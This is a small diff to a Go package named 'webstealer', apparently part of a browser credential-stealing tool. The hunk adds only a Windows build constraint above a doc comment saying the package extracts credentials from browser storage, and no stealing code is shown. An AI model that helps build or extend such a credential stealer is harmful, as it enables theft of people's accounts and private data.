@@ -1,3 +1,5 @@
+//go:build windows
+
 // Package webstealer extracts credentials from browser storage.
 package webstealer
 
